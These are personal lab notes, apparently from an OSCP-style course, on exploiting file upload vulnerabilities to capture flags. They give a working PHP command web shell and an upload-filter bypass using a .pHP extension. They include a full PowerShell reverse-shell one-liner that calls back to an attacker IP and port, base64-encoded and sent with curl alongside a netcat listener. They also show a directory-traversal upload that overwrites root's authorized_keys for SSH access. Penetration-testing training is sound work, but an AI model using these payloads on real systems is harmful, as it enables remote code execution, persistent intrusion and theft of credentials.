# Using Executable Files


1. Follow the steps above on VM #1 and exploit the file upload vulnerability. The flag is located in the **C:\xampp\passwords.txt** file as a password for the _mountainadmin_ user.$

- Use upload to send simple_backdoor.pHP to site (php misspelling to get around upload filter mechanism)
```php
<?php
if(isset($_REQUEST['cmd'])){
	echo "<pre>";
	$cmd = ($_REQUEST['cmd']);
	system($cmd);
	echo "</pre>";
	die;
}
?>
```

- Craft PowerShell one-liner using **pwsh** for a PS terminal in Kali
```powershell
# Don't forget to replace IP &/or port!!
PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'


PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

PS> $EncodedText =[Convert]::ToBase64String($Bytes)

PS> $EncodedText
```

- Copy results of $EncodedText and tack on as *cmd* parameter using **curl**
```bash
# Start nc listener in another tab
nc -nlvp 4444
# Abuse file upload
curl http://mountaindesserts.com/meteor/uploads/simple_backdoor.pHP?cmd=powershell%20-enc%20JABjAG....ACkA==
# In tab w/ listener, after connection.  NOTE Windows \
type ..\..\..\passwords.txt
```

2. The target VM #2 is running an instance of _TinyFileManager_. Disable Burp before you start to avoid issues with the web application. Log in to the web application at **hxxp://192.168.50.16/index.php** with the user **admin** and password **admin@123**. Find a way to get code execution by using an uploaded web shell. Display the contents of the **/opt/install.txt** file to get the flag.
   
- Copy the reverse shell **/usr/share/webshells/phpphp-reverse-shell.php** to current working directory and edit file to add your current IP and port of choice
- Login to website and upload the file (don't forget to rename extension to bypass .php filters jic)

- In 1 tab start a nc listener on port set in the revshell.pHP file
- In 2nd tab, execute php payload
```bash
# tab 2
curl http://192.168.193.16/revshell.pHP

# tab 1

# Using Non-Executable Files

- Use Burp and test uploading of txt file.  Send POST request to Burp's Repeater, rename uploaded filename, and test whether relative path throws an error
   ![](upload_outsideWebRoot.png)
   
- Replicate a public/ private key
```bash
# here, we'll save key to file: fileupload
ssh-keygen

# result is a private (fileupload) and public (fileupload.pub) key pair

# copy the public key to authorized_keys
cat fileupload.pub > authorized_keys
```

- Select 'authorized_keys' file to upload, Turn on Burp's Intercept, then hit Upload
- Prepend the directory traversal sequence (**../../../../root/.ssh/**) to the filename to attempt to overwrite root's own authorized_keys file
![](file_upload_keys.png)

- Attempt an SSH connection using your private key pair
```bash
# If connected to before, remove the previously saved host key
rm ~/.ssh/known_hosts

# Attempt SSH connection
ssh -i fileupload -p 2222 root@mountaindesserts.com

# Once connected cat file (it'll put you in root's home dir, but best get in habbit of using full path name for full OSCP points)
cat /root/flag.txt
```
